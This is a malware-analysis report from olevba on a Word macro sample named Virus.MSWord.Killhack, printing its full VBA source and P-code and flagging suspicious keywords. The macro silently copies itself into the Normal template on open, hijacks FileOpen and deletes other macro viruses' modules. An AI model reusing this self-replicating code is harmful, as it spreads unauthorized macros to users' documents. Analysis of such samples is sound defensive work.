olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Killhack
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Killhack - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kill_S129.bas 
in file: Virus.MSWord.Killhack - OLE stream: 'Macros/VBA/Kill_S129'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim Infected As Boolean
Dim NT, AD As Object


Sub AutoOpen()
  Dim installed As Boolean
  Dim im As Object
  Dim abt As CommandBarButton
  Dim i
  Dim oke As Boolean
  
  
  Set AD = ActiveDocument
  Set NT = NormalTemplate
  
  installed = False
  For Each im In NT.VBProject.VBComponents
     If im.Name = "Kill_S129" Then installed = True
  Next
  If Not (installed) Then
    Application.OrganizerCopy Source:=AD.FullName, Destination:=NT.FullName, Name:="Kill_S129", Object:=wdOrganizerObjectProjectItems
  End If
  
  Search_and_Kill
  oke = False
  For Each i In CommandBars("Help").Controls
    If i.Type = msoControlButton Then If i.Caption = "About Un2mU" Then oke = True
  Next
  If Not (oke) Then
    Set abt = CommandBars("Help").Controls.Add(Type:=msoControlButton)
    abt.Caption = "About Un2mU"
    abt.OnAction = "AboutUn2mU"
    abt.Enabled = True
    abt.Visible = True
    abt.Width = 79
    abt.Height = 19
    abt.Style = msoButtonIconAndCaption
  End If
End Sub
Sub FileOpen()
  Aof
  Dialogs(wdDialogFileOpen).Show
  Search_and_Kill
  Aon
End Sub
Sub RepairMenu()
Dim IC As CommandBarControl
Dim damaged As Boolean

On Error Resume Next
damaged = False
For Each IC In CommandBars("Help").Controls
  If IC.Caption = "Assalamu'alaikum Wr. Wb....." Then damaged = True
Next
If Not (damaged) Then
  For Each IC In CommandBars("Tools").Controls
    If IC.Caption = "Makmu, Cok.....!!!!" Then damaged = True
  Next
End If
If damaged Then
    MsgBox "Repair WORD from S129-effect", vbOKOnly, "Un2mU Virii division"
    CommandBars("Help").Controls("Assalamu'alaikum Wr. Wb.....").Caption = ("About Microsoft Word")
    CommandBars("Tools").Controls("Makmu, Cok.....!!!!").Caption = ("Macro")
    CommandBars("Tools").Controls("Tempe dan Tahu Enak...!!!").Caption = ("Templates and Add-ins...")
    CommandBars("Tools").Controls("Macro").Visible = True
    CommandBars("Tools").Controls("Macro").Enabled = True
    CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = True
End If
Options.VirusProtection = True
Aon
End Sub

Sub Search_and_Kill()
  Dim im As Object
  On Error Resume Next
  Set AD = ActiveDocument
  Set NT = NormalTemplate
  For Each im In NT.VBProject.VBComponents
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "astia" Then
      MsgBox "Found & Kills virus Titasic at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "CyberHack" Or im.Name = "CyberForm" Then
      MsgBox "Found & Kills virus CyberHack/Dwiganteng at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
    
  Next
  For Each im In AD.VBProject.VBComponents
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "astia" Then
      MsgBox "Found & Kills virus Titasic at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "CyberHack" Or im.Name = "CyberForm" Then
      MsgBox "Found & Kills virus CyberHack/Dwiganteng at " & AD.FullName, vbOKOnly, "Un2mU Virii division"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
    
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=AD.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
  Next
  
  RepairMenu
   
End Sub

Sub Aof()
  WordBasic.DisableAutoMacros True
End Sub

Sub Aon()
  WordBasic.DisableAutoMacros False
End Sub
Sub AboutUn2mU()
Dim s As String
s = "   Un2mU WM-AV Ver 1.3" & Chr(13) _
& "Made by david_ys@i.am (c) 1999" & Chr(13) _
& "   http://come.to/un2mu"
MsgBox s, vbOKOnly, "About Un2mU WM-AV"
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Killhack
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Kill_S129 - 7953 bytes
' Line #0:
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn Infected (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn NT
' 	VarDefn AD (As Object)
' Line #4:
' Line #5:
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	Dim 
' 	VarDefn installed (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn im (As Object)
' Line #9:
' 	Dim 
' 	VarDefn abt
' Line #10:
' 	Dim 
' 	VarDefn i
' Line #11:
' 	Dim 
' 	VarDefn oke (As Boolean)
' Line #12:
' Line #13:
' Line #14:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #16:
' Line #17:
' 	LitVarSpecial (False)
' 	St installed 
' Line #18:
' 	StartForVariable 
' 	Ld im 
' 	EndForVariable 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #19:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0009 "Kill_S129"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St installed 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	Ld installed 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #22:
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Kill_S129"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	ArgsCall Search_and_Kill 0x0000 
' Line #26:
' 	LitVarSpecial (False)
' 	St oke 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #28:
' 	Ld i 
' 	MemLd TypeOf 
' 	Ld msoControlButton 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	MemLd Caption 
' 	LitStr 0x000B "About Un2mU"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St oke 
' 	EndIf 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	Ld oke 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #31:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0001 
' 	Set abt 
' Line #32:
' 	LitStr 0x000B "About Un2mU"
' 	Ld abt 
' 	MemSt Caption 
' Line #33:
' 	LitStr 0x000A "AboutUn2mU"
' 	Ld abt 
' 	MemSt OnAction 
' Line #34:
' 	LitVarSpecial (True)
' 	Ld abt 
' 	MemSt Enabled 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld abt 
' 	MemSt Visible 
' Line #36:
' 	LitDI2 0x004F 
' 	Ld abt 
' 	MemSt With 
' Line #37:
' 	LitDI2 0x0013 
' 	Ld abt 
' 	MemSt Height 
' Line #38:
' 	Ld msoButtonIconAndCaption 
' 	Ld abt 
' 	MemSt Style 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Sub FileOpen())
' Line #42:
' 	ArgsCall Aof 0x0000 
' Line #43:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #44:
' 	ArgsCall Search_and_Kill 0x0000 
' Line #45:
' 	ArgsCall Aon 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub RepairMenu())
' Line #48:
' 	Dim 
' 	VarDefn IC (As CommandBarControl)
' Line #49:
' 	Dim 
' 	VarDefn damaged (As Boolean)
' Line #50:
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	LitVarSpecial (False)
' 	St damaged 
' Line #53:
' 	StartForVariable 
' 	Ld IC 
' 	EndForVariable 
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #54:
' 	Ld IC 
' 	MemLd Caption 
' 	LitStr 0x001C "Assalamu'alaikum Wr. Wb....."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St damaged 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	Ld damaged 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld IC 
' 	EndForVariable 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #58:
' 	Ld IC 
' 	MemLd Caption 
' 	LitStr 0x0013 "Makmu, Cok.....!!!!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St damaged 
' 	EndIf 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld damaged 
' 	IfBlock 
' Line #62:
' 	LitStr 0x001C "Repair WORD from S129-effect"
' 	Ld vbOKOnly 
' 	LitStr 0x0014 "Un2mU Virii division"
' 	ArgsCall MsgBox 0x0003 
' Line #63:
' 	LitStr 0x0014 "About Microsoft Word"
' 	Paren 
' 	LitStr 0x001C "Assalamu'alaikum Wr. Wb....."
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #64:
' 	LitStr 0x0005 "Macro"
' 	Paren 
' 	LitStr 0x0013 "Makmu, Cok.....!!!!"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #65:
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	Paren 
' 	LitStr 0x0019 "Tempe dan Tahu Enak...!!!"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #66:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #67:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #68:
' 	LitVarSpecial (True)
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #71:
' 	ArgsCall Aon 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Sub Search_and_Kill())
' Line #75:
' 	Dim 
' 	VarDefn im (As Object)
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #78:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #79:
' 	StartForVariable 
' 	Ld im 
' 	EndForVariable 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #80:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0004 "S129"
' 	Eq 
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0008 "S129Form"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #81:
' 	LitStr 0x002B "Found & Kills virus S129 at Normal template"
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #82:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #83:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0005 "astia"
' 	Eq 
' 	ElseIfBlock 
' Line #84:
' 	LitStr 0x002E "Found & Kills virus Titasic at Normal template"
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #85:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #86:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0009 "CyberForm"
' 	Eq 
' 	Or 
' 	ElseIfBlock 
' Line #87:
' 	LitStr 0x003B "Found & Kills virus CyberHack/Dwiganteng at Normal template"
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #88:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #89:
' 	EndIfBlock 
' Line #90:
' Line #91:
' 	StartForVariable 
' 	Next 
' Line #92:
' 	StartForVariable 
' 	Ld im 
' 	EndForVariable 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #93:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0004 "S129"
' 	Eq 
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0008 "S129Form"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #94:
' 	LitStr 0x001C "Found & Kills virus S129 at "
' 	Ld AD 
' 	MemLd FullName 
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #95:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #96:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0005 "astia"
' 	Eq 
' 	ElseIfBlock 
' Line #97:
' 	LitStr 0x001F "Found & Kills virus Titasic at "
' 	Ld AD 
' 	MemLd FullName 
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #99:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0009 "CyberForm"
' 	Eq 
' 	Or 
' 	ElseIfBlock 
' Line #100:
' 	LitStr 0x002C "Found & Kills virus CyberHack/Dwiganteng at "
' 	Ld AD 
' 	MemLd FullName 
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0014 "Un2mU Virii division"
' 	ArgsCall MsgBox 0x0003 
' Line #101:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0004 "S129"
' 	Eq 
' 	Ld im 
' 	MemLd New 
' 	LitStr 0x0008 "S129Form"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #105:
' 	LitStr 0x001C "Found & Kills virus S129 at "
' 	Ld AD 
' 	MemLd FullName 
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0013 "Un2mU WM-AV Ver 1.3"
' 	ArgsCall MsgBox 0x0003 
' Line #106:
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld im 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	StartForVariable 
' 	Next 
' Line #109:
' Line #110:
' 	ArgsCall RepairMenu 0x0000 
' Line #111:
' Line #112:
' 	EndSub 
' Line #113:
' Line #114:
' 	FuncDefn (Sub Aof())
' Line #115:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub Aon())
' Line #119:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub AboutUn2mU())
' Line #122:
' 	Dim 
' 	VarDefn s (As String)
' Line #123:
' 	LineCont 0x0008 08 00 00 00 0F 00 00 00
' 	LitStr 0x0016 "   Un2mU WM-AV Ver 1.3"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001E "Made by david_ys@i.am (c) 1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0017 "   http://come.to/un2mu"
' 	Concat 
' 	St s 
' Line #124:
' 	Ld s 
' 	Ld vbOKOnly 
' 	LitStr 0x0011 "About Un2mU WM-AV"
' 	ArgsCall MsgBox 0x0003 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' Line #128:
' Line #129:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://come.to/un2mu|URL                                          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

